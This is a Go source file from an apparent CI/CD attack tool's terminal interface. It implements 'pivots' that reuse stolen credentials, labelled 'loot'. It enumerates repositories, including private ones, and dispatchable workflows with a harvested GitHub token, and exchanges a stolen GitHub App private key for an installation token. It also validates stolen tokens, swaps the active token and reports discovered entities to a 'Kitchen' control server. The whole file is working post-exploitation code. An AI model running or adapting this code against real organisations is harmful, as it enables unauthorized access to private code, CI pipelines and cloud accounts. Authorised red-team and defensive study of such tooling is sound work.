// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package tui

import (
	"context"
	"fmt"
	"log/slog"
	"strings"
	"time"

	tea "charm.land/bubbletea/v2"

	"github.com/boostsecurityio/smokedmeat/internal/counter"
)

type PivotType int

const (
	PivotTypeGitHubToken PivotType = iota
	PivotTypeCloudOIDC
	PivotTypeGitHubApp
	PivotTypeSSHKey
)

func (p PivotType) String() string {
	switch p {
	case PivotTypeGitHubToken:
		return "github"
	case PivotTypeCloudOIDC:
		return "cloud-oidc"
	case PivotTypeGitHubApp:
		return "github-app"
	case PivotTypeSSHKey:
		return "ssh"
	default:
		return "unknown"
	}
}

// PermissionGain tracks new permissions discovered on a known repo.
type PermissionGain struct {
	Repo     string
	OldPerms []string
	NewPerms []string
}

// PivotResultMsg contains the delta results from a pivot operation.
// Only NEW discoveries are included - repos/orgs we already knew about are filtered.
type PivotResultMsg struct {
	Type       PivotType
	Success    bool
	Provider   string
	KeyName    string
	KeyValue   string
	KeyType    string
	KeyFP      string
	SSHScope   string
	SSHResults []SSHTrialResult

	// Delta-aware fields (only NEW discoveries)
	NewOrgs         []string         // Orgs we didn't know about
	NewRepos        []string         // Repos we didn't know about
	NewPrivateRepos []string         // Private repos discovered (subset of NewRepos)
	NewPerms        []PermissionGain // New permissions on known repos
	TotalFound      int              // Total from API (before delta filtering)

	NewVulns          []Vulnerability
	DispatchWorkflows []WorkflowDispatchSelection
	Credentials       []CollectedSecret
	TokenPermissions  map[string]string
	Err               error
}

func (m Model) executePivot(pivotType PivotType, target string) tea.Cmd {
	return func() (msg tea.Msg) {
		defer func() {
			if r := recover(); r != nil {
				slog.Error("pivot panicked", "type", pivotType.String(), "error", r)
				msg = PivotResultMsg{Type: pivotType, Success: false, Err: fmt.Errorf("internal error: %v", r)}
			}
		}()
		switch pivotType {
		case PivotTypeGitHubToken:
			return m.executeGitHubPivot(target)
		case PivotTypeCloudOIDC:
			return m.executeCloudOIDCPivot(target)
		case PivotTypeGitHubApp:
			return m.executeGitHubAppPivot(target)
		case PivotTypeSSHKey:
			return m.executeSSHPivot(target)
		default:
			return PivotResultMsg{Type: pivotType, Success: false, Err: fmt.Errorf("unknown pivot type")}
		}
	}
}

func lootSecretIdentity(secret CollectedSecret) string {
	return secret.Name + "\x00" + secret.Type + "\x00" + secret.Value
}

func (m Model) collectLootCandidates(match func(CollectedSecret) bool) []CollectedSecret {
	var candidates []CollectedSecret
	seen := make(map[string]bool)

	appendMatches := func(secrets []CollectedSecret) {
		for _, secret := range secrets {
			if !match(secret) {
				continue
			}
			key := lootSecretIdentity(secret)
			if seen[key] {
				continue
			}
			seen[key] = true
			candidates = append(candidates, secret)
		}
	}

	appendMatches(m.lootStash)
	appendMatches(m.sessionLoot)
	return candidates
}

func (m Model) resolveLootDrivenSecret(kind string, match func(CollectedSecret) bool) (CollectedSecret, error) {
	if secret := m.SelectedLootSecret(); secret != nil && match(*secret) {
		return *secret, nil
	}

	candidates := m.collectLootCandidates(match)
	switch len(candidates) {
	case 0:
		return CollectedSecret{}, fmt.Errorf("no %s found in loot", kind)
	case 1:
		return candidates[0], nil
	default:
		return CollectedSecret{}, fmt.Errorf("multiple %s found in loot; select one in Loot or press 'p'", kind)
	}
}

func (m Model) selectedLootPivotToken() *CollectedSecret {
	secret := m.SelectedLootSecret()
	if secret == nil || !m.canPivotSecret(*secret) || !secret.CanUseAsToken() {
		return nil
	}
	return secret
}

func (m Model) isGitHubAppKeySecret(secret CollectedSecret) bool {
	if secret.Type == "github_app_key" {
		return strings.TrimSpace(secret.Value) != ""
	}
	return strings.TrimSpace(secret.Value) != "" && m.workflowSecretTypes[secret.Name] == "github_app_key"
}

func (m Model) isGitHubAppIDSecret(secret CollectedSecret) bool {
	if secret.Type == "github_app_id" {
		return strings.TrimSpace(secret.Value) != ""
	}
	return strings.TrimSpace(secret.Value) != "" && m.workflowSecretTypes[secret.Name] == "github_app_id"
}

func (m Model) findPairedAppKey(appID string) *CollectedSecret {
	if appID == "" {
		return nil
	}

	match := func(secret CollectedSecret) bool {
		return m.isGitHubAppKeySecret(secret) && strings.TrimSpace(secret.PairedAppID) == appID
	}

	if secret := m.SelectedLootSecret(); secret != nil && match(*secret) {
		return secret
	}

	candidates := m.collectLootCandidates(match)
	if len(candidates) == 1 {
		return &candidates[0]
	}
	return nil
}

func (m Model) resolveGitHubAppPivot(target string) (CollectedSecret, string, error) {
	selected := m.SelectedLootSecret()
	appID := strings.TrimSpace(target)

	if selected != nil && m.isGitHubAppIDSecret(*selected) && appID == "" {
		appID = strings.TrimSpace(selected.Value)
	}

	if selected != nil && m.isGitHubAppKeySecret(*selected) {
		if appID == "" {
			appID = strings.TrimSpace(selected.PairedAppID)
		}
		if appID == "" {
			appID = m.detectAppID()
		}
		if appID == "" {
			return CollectedSecret{}, "", fmt.Errorf("no App ID found - provide as: pivot app <app_id>")
		}
		return *selected, appID, nil
	}

	if appID != "" {
		if paired := m.findPairedAppKey(appID); paired != nil {
			return *paired, appID, nil
		}
	}

	keySecret, err := m.resolveLootDrivenSecret("GitHub App keys", m.isGitHubAppKeySecret)
	if err != nil {
		return CollectedSecret{}, "", err
	}

	if appID == "" {
		appID = strings.TrimSpace(keySecret.PairedAppID)
	}
	if appID == "" {
		appID = m.detectAppID()
	}
	if appID == "" {
		return CollectedSecret{}, "", fmt.Errorf("no App ID found - provide as: pivot app <app_id>")
	}

	return keySecret, appID, nil
}

func (m Model) executeGitHubPivot(target string) PivotResultMsg {
	if m.tokenInfo == nil || m.tokenInfo.Value == "" {
		return PivotResultMsg{
			Type:    PivotTypeGitHubToken,
			Success: false,
			Err:     fmt.Errorf("no GitHub token configured"),
		}
	}
	return m.executeGitHubPivotWithToken(m.tokenInfo.Value, "pivot:GITHUB_TOKEN", target)
}

func (m Model) executeGitHubPivotWithToken(token, discoveredVia, target string) PivotResultMsg {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	var targetOwner, targetRepo string
	if target != "" {
		parts := strings.Split(target, "/")
		if len(parts) == 2 {
			targetOwner = parts[0]
			targetRepo = parts[1]
		} else {
			targetOwner = target
		}
	}

	if targetOwner != "" && targetRepo != "" {
		workflows, err := m.kitchenClient.ListWorkflowsWithDispatch(ctx, token, targetOwner, targetRepo)
		if err != nil {
			return PivotResultMsg{
				Type:    PivotTypeGitHubToken,
				Success: false,
				Err:     fmt.Errorf("failed to list workflows: %w", err),
			}
		}

		repoName := fmt.Sprintf("%s/%s", targetOwner, targetRepo)
		var dispatchWorkflows []WorkflowDispatchSelection
		for _, wf := range workflows {
			dispatchWorkflows = append(dispatchWorkflows, WorkflowDispatchSelection{
				Repository: repoName,
				Workflow:   wf.Path,
				Ref:        wf.Ref,
				Inputs:     wf.Inputs,
				Values:     workflowDispatchDefaultValues(wf.Inputs),
			})
		}

		entityID := "repo:" + repoName

		var newRepos []string
		if _, known := m.knownEntities[entityID]; !known {
			newRepos = []string{repoName}
			m.recordPivotEntity(repoName, "repo", discoveredVia, false, false, "")
		}

		return PivotResultMsg{
			Type:              PivotTypeGitHubToken,
			Success:           true,
			NewRepos:          newRepos,
			DispatchWorkflows: dispatchWorkflows,
			TotalFound:        1,
		}
	}

	repos, err := m.kitchenClient.ListReposWithInfo(ctx, token)
	if err != nil {
		return PivotResultMsg{
			Type:    PivotTypeGitHubToken,
			Success: false,
			Err:     fmt.Errorf("failed to list repos: %w", err),
		}
	}

	var allRepos []counter.RepoInfo
	if targetOwner != "" {
		for _, repo := range repos {
			if strings.HasPrefix(repo.FullName, targetOwner+"/") {
				allRepos = append(allRepos, repo)
			}
		}
	} else {
		allRepos = repos
	}

	totalFound := len(allRepos)

	var newRepos []string
	var newPrivateRepos []string
	var newOrgs []string
	seenOrgs := make(map[string]bool)

	for _, repo := range allRepos {
		entityID := "repo:" + repo.FullName
		if _, known := m.knownEntities[entityID]; !known {
			newRepos = append(newRepos, repo.FullName)
			if repo.IsPrivate {
				newPrivateRepos = append(newPrivateRepos, repo.FullName)
			}
		}
		m.recordPivotEntity(repo.FullName, "repo", discoveredVia, repo.IsPrivate, repo.CanPush, "")

		parts := strings.Split(repo.FullName, "/")
		if len(parts) >= 2 {
			org := parts[0]
			if !seenOrgs[org] {
				seenOrgs[org] = true
				orgEntityID := "org:" + org
				if _, known := m.knownEntities[orgEntityID]; !known {
					newOrgs = append(newOrgs, org)
				}
				m.recordPivotEntity(org, "org", discoveredVia, false, false, "")
			}
		}
	}

	slog.Debug("pivot delta computed",
		"total_found", totalFound,
		"new_repos", len(newRepos),
		"new_private_repos", len(newPrivateRepos),
		"new_orgs", len(newOrgs),
	)

	return PivotResultMsg{
		Type:            PivotTypeGitHubToken,
		Success:         true,
		NewRepos:        newRepos,
		NewPrivateRepos: newPrivateRepos,
		NewOrgs:         newOrgs,
		TotalFound:      totalFound,
	}
}

func strongerSSHPermission(current, incoming string) string {
	if incoming == "write" {
		return "write"
	}
	if current == "write" {
		return "write"
	}
	if incoming == "read" {
		return "read"
	}
	return current
}

func (m *Model) recordPivotEntity(name, entityType, discoveredVia string, isPrivate, canPush bool, sshPermission string) {
	if m.knownEntities == nil {
		m.knownEntities = make(map[string]*KnownEntity)
	}

	entityID := entityType + ":" + name

	if existing, exists := m.knownEntities[entityID]; exists {
		updated := false
		if isPrivate && !existing.IsPrivate {
			existing.IsPrivate = true
			updated = true
		}
		if canPush && !hasPerm(existing.Permissions, "push") {
			existing.Permissions = append(existing.Permissions, "push")
			updated = true
		}
		if stronger := strongerSSHPermission(existing.SSHPermission, sshPermission); stronger != existing.SSHPermission {
			existing.SSHPermission = stronger
			updated = true
		}
		if updated {
			m.syncEntityToKitchen(existing)
		}
		return
	}

	var perms []string
	if canPush {
		perms = append(perms, "push")
	}

	entity := &KnownEntity{
		ID:            entityID,
		EntityType:    entityType,
		Name:          name,
		DiscoveredAt:  time.Now(),
		DiscoveredVia: discoveredVia,
		IsPrivate:     isPrivate,
		Permissions:   perms,
		SSHPermission: sshPermission,
	}
	m.knownEntities[entityID] = entity
	m.syncEntityToKitchen(entity)
}

func hasPerm(perms []string, p string) bool {
	for _, v := range perms {
		if v == p {
			return true
		}
	}
	return false
}

func (m *Model) syncEntityToKitchen(e *KnownEntity) {
	if m.kitchenClient != nil && m.config.SessionID != "" {
		go func(e *KnownEntity) {
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()
			payload := counter.KnownEntityPayload{
				ID:            e.ID,
				EntityType:    e.EntityType,
				Name:          e.Name,
				SessionID:     m.config.SessionID,
				DiscoveredVia: e.DiscoveredVia,
				IsPrivate:     e.IsPrivate,
				Permissions:   e.Permissions,
				SSHPermission: e.SSHPermission,
			}
			_ = m.kitchenClient.RecordKnownEntity(ctx, payload)
		}(e)
	}
}

func (m Model) executeGitHubAppPivot(target string) PivotResultMsg {
	keySecret, appID, err := m.resolveGitHubAppPivot(target)
	if err != nil {
		slog.Warn("app pivot resolution failed",
			"structural_types", len(m.workflowSecretTypes),
			"loot_count", len(m.lootStash),
			"session_loot_count", len(m.sessionLoot),
			"error", err)
		return PivotResultMsg{Type: PivotTypeGitHubApp, Success: false, Err: err}
	}

	if m.kitchenClient == nil {
		return PivotResultMsg{Type: PivotTypeGitHubApp, Success: false, Err: fmt.Errorf("not connected to Kitchen")}
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	installations, err := m.kitchenClient.ListAppInstallations(ctx, keySecret.Value, appID)
	if err != nil {
		return PivotResultMsg{Type: PivotTypeGitHubApp, Success: false, Err: fmt.Errorf("list installations: %w", err)}
	}

	if len(installations) == 0 {
		return PivotResultMsg{Type: PivotTypeGitHubApp, Success: false, Err: fmt.Errorf("no installations found for app %s", appID)}
	}

	resp, err := m.kitchenClient.CreateInstallationToken(ctx, keySecret.Value, appID, installations[0].ID)
	if err != nil {
		return PivotResultMsg{Type: PivotTypeGitHubApp, Success: false, Err: fmt.Errorf("create installation token: %w", err)}
	}

	result := PivotResultMsg{
		Type:    PivotTypeGitHubApp,
		Success: true,
		Credentials: []CollectedSecret{{
			Name:        fmt.Sprintf("APP_TOKEN_%s", installations[0].Account),
			Value:       resp.Token,
			Type:        "github_app_token",
			Source:      "pivot:app:" + appID,
			CollectedAt: time.Now(),
			ExpiresAt:   &resp.ExpiresAt,
		}},
		TokenPermissions: resp.Permissions,
	}

	repos, err := m.kitchenClient.ListReposWithInfo(ctx, resp.Token)
	if err == nil {
		seenOrgs := make(map[string]bool)
		for _, repo := range repos {
			entityID := "repo:" + repo.FullName
			if _, known := m.knownEntities[entityID]; !known {
				result.NewRepos = append(result.NewRepos, repo.FullName)
				if repo.IsPrivate {
					result.NewPrivateRepos = append(result.NewPrivateRepos, repo.FullName)
				}
			}
			m.recordPivotEntity(repo.FullName, "repo", "pivot:app:"+appID, repo.IsPrivate, repo.CanPush, "")
			parts := strings.Split(repo.FullName, "/")
			if len(parts) >= 2 {
				org := parts[0]
				if !seenOrgs[org] {
					seenOrgs[org] = true
					orgEntityID := "org:" + org
					if _, known := m.knownEntities[orgEntityID]; !known {
						result.NewOrgs = append(result.NewOrgs, org)
					}
					m.recordPivotEntity(org, "org", "pivot:app:"+appID, false, false, "")
				}
			}
		}
		result.TotalFound = len(repos)
	}

	return result
}

func (m Model) detectAppID() string {
	for _, s := range m.lootStash {
		if s.PairedAppID != "" {
			return s.PairedAppID
		}
	}
	for _, s := range m.sessionLoot {
		if s.PairedAppID != "" {
			return s.PairedAppID
		}
	}

	for name, typ := range m.workflowSecretTypes {
		if typ == "github_app_id" {
			for _, s := range m.lootStash {
				if s.Name == name && s.Value != "" {
					return strings.TrimSpace(s.Value)
				}
			}
			for _, s := range m.sessionLoot {
				if s.Name == name && s.Value != "" {
					return strings.TrimSpace(s.Value)
				}
			}
		}
	}

	if len(m.hardcodedAppIDs) > 0 {
		return m.hardcodedAppIDs[0]
	}

	patterns := []string{"APP_ID", "GITHUB_APP_ID", "GH_APP_ID"}
	for _, s := range m.lootStash {
		upper := strings.ToUpper(s.Name)
		for _, p := range patterns {
			if strings.Contains(upper, p) && !strings.Contains(upper, "KEY") && !strings.Contains(upper, "PEM") {
				return strings.TrimSpace(s.Value)
			}
		}
	}
	for _, s := range m.sessionLoot {
		upper := strings.ToUpper(s.Name)
		for _, p := range patterns {
			if strings.Contains(upper, p) && !strings.Contains(upper, "KEY") && !strings.Contains(upper, "PEM") {
				return strings.TrimSpace(s.Value)
			}
		}
	}
	return ""
}

func (m Model) executeCloudOIDCPivot(provider string) tea.Msg {
	if m.activeAgent == nil {
		return PivotResultMsg{
			Type:     PivotTypeCloudOIDC,
			Provider: provider,
			Success:  false,
			Err:      fmt.Errorf("no active agent for OIDC pivot"),
		}
	}

	config := m.lookupCloudConfig(provider)
	return CloudPivotOrderMsg{Provider: provider, Config: config}
}

type SecretValidationMsg struct {
	SecretName  string
	Success     bool
	ValidStatus string
	Owner       string
	Scopes      []string
	ExpiresAt   *time.Time
	Err         error
}

func (m Model) validateSecretByName(name, value string) tea.Cmd {
	return func() tea.Msg {
		if value == "" {
			return SecretValidationMsg{SecretName: name, Success: false, Err: fmt.Errorf("empty token value")}
		}

		if strings.Contains(value, "-----BEGIN") {
			return SecretValidationMsg{SecretName: name, Success: false, Err: fmt.Errorf("PEM key - use 'pivot app' to exchange for token")}
		}

		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()

		resp, err := m.kitchenClient.GetAuthenticatedUser(ctx, value)
		if err != nil {
			return SecretValidationMsg{SecretName: name, Success: false, ValidStatus: "invalid", Err: err}
		}

		scopes := resp.Scopes
		if strings.HasPrefix(value, "ghs_") && len(scopes) == 0 {
			scopes = []string{"(workflow permissions)"}
		}

		return SecretValidationMsg{
			SecretName:  name,
			Success:     true,
			ValidStatus: "valid",
			Owner:       resp.Login,
			Scopes:      scopes,
		}
	}
}

func (m *Model) preparePivotToken(secret CollectedSecret) {
	m.pivotToken = &secret
	if m.initialTokenInfo == nil && m.tokenInfo != nil {
		m.initialTokenInfo = m.tokenInfo
		cfg, _ := counter.LoadConfig()
		if cfg != nil {
			cfg.InitialAccessToken = m.tokenInfo.Value
			cfg.InitialAccessTokenSource = m.tokenInfo.Source
			_ = counter.SaveConfig(cfg)
		}
	}
	m.swapActiveToken(secret)
}

func (m Model) executePivotWithSecret(secret CollectedSecret, target string) tea.Cmd {
	return func() tea.Msg {
		if secret.Value == "" {
			return PivotResultMsg{Type: PivotTypeGitHubToken, Success: false, Err: fmt.Errorf("empty token value")}
		}
		return m.executeGitHubPivotWithToken(secret.Value, "pivot:loot:"+secret.Name, target)
	}
}
